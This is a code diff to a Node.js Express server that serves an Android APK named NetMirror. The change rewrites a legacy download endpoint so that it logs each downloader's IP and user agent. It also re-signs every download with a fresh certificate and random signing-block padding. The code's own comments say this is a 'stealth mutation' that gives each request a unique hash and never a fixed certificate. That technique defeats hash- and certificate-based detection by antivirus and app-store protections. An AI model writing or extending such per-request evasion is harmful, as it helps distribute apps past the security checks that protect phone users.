@@ -927,28 +927,56 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // Legacy endpoint — kept for backward compat (admin app, direct links)
+  // Legacy endpoint — kept for backward compat (landing-page fallback after
+  // /dl/:token retries fail, admin-app share links). Applies the SAME per-request
+  // stealth mutation as /dl/:token so this path never leaks a fixed-cert APK.
   app.get('/downloadapp/Netmirror.apk', async (req, res) => {
     try {
-      const apkBuf = await getApkBuffer();
+      try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '', source: 'legacy_downloadapp' }); } catch (_) {}
+
+      // Resolve source APK using the same 3-tier priority as /dl/:token.
+      let sourceBuf = null;
+      let sourceLabel = '';
+      try {
+        const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
+        if (deployedRow && deployedRow.value) {
+          const signedPath = path.join(__dirname, 'data', 'signed_apks', `${deployedRow.value}_signed.apk`);
+          if (fs.existsSync(signedPath)) { sourceBuf = fs.readFileSync(signedPath); sourceLabel = `deployed:${deployedRow.value}`; }
+        }
+      } catch (_) {}
+
+      if (!sourceBuf) {
+        let wrapperBuf = getWrapperApkBuffer();
+        if (!wrapperBuf) {
+          try { await ensureWrapperFromGitHub(); } catch (_) {}
+          wrapperBuf = getWrapperApkBuffer();
+        }
+        if (wrapperBuf) { sourceBuf = wrapperBuf; sourceLabel = 'wrapper'; }
+      }
+
+      if (!sourceBuf) {
+        try { sourceBuf = await getApkBuffer(); sourceLabel = 'full'; } catch (_) {}
+      }
+
+      if (!sourceBuf) {
+        return res.status(503).send('App is being prepared. Please try again in 30 seconds.');
+      }
+
+      // Fresh hardened cert + random signing-block padding → unique hash per request.
+      // Both helpers return the source unchanged on internal failure.
+      let out = mutateAndSignStealth(sourceBuf);
+      out = padApkSigningBlock(out);
+
+      console.log(`[Legacy DL] Serving stealth-mutated APK from ${sourceLabel} (${(out.length / 1048576).toFixed(2)} MB)`);
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', apkBuf.length);
-      res.setHeader('Cache-Control', 'no-store');
-      res.end(apkBuf);
+      res.setHeader('Content-Length', out.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(out);
     } catch (err) {
-      console.error('[Landing Download] Fallback to static APK:', err.message);
-      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
-      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
-      let apkPath = fs.existsSync(securePath) ? securePath : fs.existsSync(regularPath) ? regularPath : null;
-      if (apkPath) {
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', fs.statSync(apkPath).size);
-        res.sendFile(apkPath);
-      } else {
-        res.status(404).send('APK not available yet. Please upload one via admin panel.');
-      }
+      console.error('[Legacy DL] Failed:', err.message);
+      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     }
   });
 
